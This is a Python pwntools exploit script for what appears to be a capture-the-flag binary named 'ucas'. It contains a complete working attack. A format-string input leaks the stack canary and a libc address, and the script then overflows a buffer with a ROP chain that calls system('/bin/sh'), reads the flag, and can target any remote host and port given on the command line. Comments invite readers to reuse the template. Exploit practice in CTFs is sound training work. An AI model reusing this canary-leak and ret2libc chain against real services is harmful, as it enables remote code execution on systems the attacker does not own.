#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./ucas_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main+531; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)

canary_offset = 513
libc_offset = 515
bof = 1336

io = start()
io.recvline()
io.sendline(f"%{canary_offset}$p.%{libc_offset}$p".encode())
io.recvuntil(b"welcome, ")


data = io.recvline().strip().split(b'.')
canary = int(data[0], 16)
libc_leak = int(data[1], 16)
fgets = libc_leak + 374219
libc.address = fgets - libc.sym['fgets']

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
#idk ROP sometimes doesn't get this gadget so I've hardcoded it
pop_rdx = 0x00000000001a3b32 + libc.address # pop rdx; add edi, esi; ret; 

success(f"canary value @ {hex(canary)}")
success(f"libc leak    @ {hex(libc_leak)}")
success(f"fgets         @ {hex(fgets)}")
success(f"libc base    @ {hex(libc.address)}")

payload = flat({bof: [
    canary,
    676767,             # fake rbp
    pop_rdx, 0,
    rop.rdi[0], binsh,
    rop.rsi[0], 0,
    rop.ret[0],
    libc.sym['system']
    ]})


io.sendline()
io.sendline()
io.sendline(payload)

io.sendline(b"cat flag")
data = io.recvregex(rb'gaslightCTF\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
